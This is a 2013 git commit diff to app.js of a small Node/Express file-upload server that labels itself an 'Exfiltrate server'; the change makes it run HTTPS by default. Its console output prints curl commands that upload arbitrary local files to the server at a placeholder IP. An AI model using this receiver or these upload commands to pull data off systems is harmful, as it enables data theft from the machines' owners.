64dd890d13f50f699d844e741de3104b9e3f2926
Adam Baldwin <baldwin@andyet.net>
2013-01-31 00:55:29 -0500

    updated to run https server by default

--- app.js
+++ app.js
@@ -2,7 +2,28 @@ var express = require('express'),
     uuid = require('node-uuid'),
     fs = require('fs');
 
-var app = module.exports = express.createServer();
+var arg = require('optimist')
+    .usage('Usage: $0')
+    .alias('h','help')
+    .describe('insecure', 'Start insecure HTTP server');
+
+var argv = arg.argv;
+
+if (argv.help) {
+    console.error(arg.help());
+    process.exit();
+}
+
+var secure = true;
+if (argv.insecure) {
+    var app = module.exports = express.createServer();
+    secure = false;
+} else {
+    var privateKey = fs.readFileSync('ssl/ssl.key').toString();
+    //var ca = (config.http.ca) ? fs.readFileSync(config.http.ca).toString() : '';
+    var certificate = fs.readFileSync('ssl/ssl.crt').toString();
+    var app = express.createServer({key: privateKey, cert: certificate});
+}
 
 try {
     fs.mkdirSync(__dirname + "/files");
@@ -29,5 +50,9 @@ function (err) {
 app.listen(3000, '0.0.0.0', function(){
     console.log("Exfiltrate server listening on 0.0.0.0:%d in %s mode", app.address().port, app.settings.env);
     console.log("Send files like this:");
-    console.log('curl -F "data=@/path/to/filename" http://1.2.3.4:%d', app.address().port);
+    if (secure) {
+        console.log('curl -k https://1.2.3.4:%d -F "data=@/path/to/filename"', app.address().port);
+    } else { 
+        console.log('curl http://1.2.3.4:%d -F "data=@/path/to/filename"', app.address().port);
+    }
 });
